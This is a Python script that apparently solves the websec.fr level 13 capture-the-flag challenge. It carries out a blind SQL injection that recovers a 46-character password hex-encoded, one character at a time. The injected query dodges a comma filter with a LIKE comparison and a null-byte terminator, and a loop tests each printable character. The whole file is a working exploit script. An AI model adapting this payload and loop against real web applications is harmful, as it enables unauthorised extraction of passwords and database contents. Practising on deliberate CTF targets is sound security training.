from requests import Session
import sys

r = Session()

chk = "<code>0</code>"
#if you can't use comma(,) blind sql injection like this.
#Dirty Way & not efficient
len = 46 #length of flag  (find with length(user_password))
flag = ['' for x in range(len)]
max_flag = 10
f_flag = ""
for f in range(46):
    for c in range(33,127):
        payload = "http://websec.fr/level13/index.php?ids=a,0)) and hex(user_password) like'{f}%25'\x00&submit=Go"
        flag[f] = hex(c).lstrip("0x").upper()
        tmp = ''.join(flag)
        if f > max_flag:
            payload = "http://websec.fr/level13/index.php?ids=a,0)) and hex(user_password) like'%25{f}%25'\x00&submit=Go"
            tmp = ''.join(flag[f-max_flag:])
        res = r.get(payload.format(f=tmp))
        sys.stdout.write("\rnow testing - "+str(f)+" "+chr(c)+" // FLAG : "+''.join(flag))
        if chk in res.text:
            flag[f] = hex(c).lstrip("0x").upper()
            f_flag += chr(c)
            print("\n[*] FLAG :",f_flag)
            break
print(f_flag)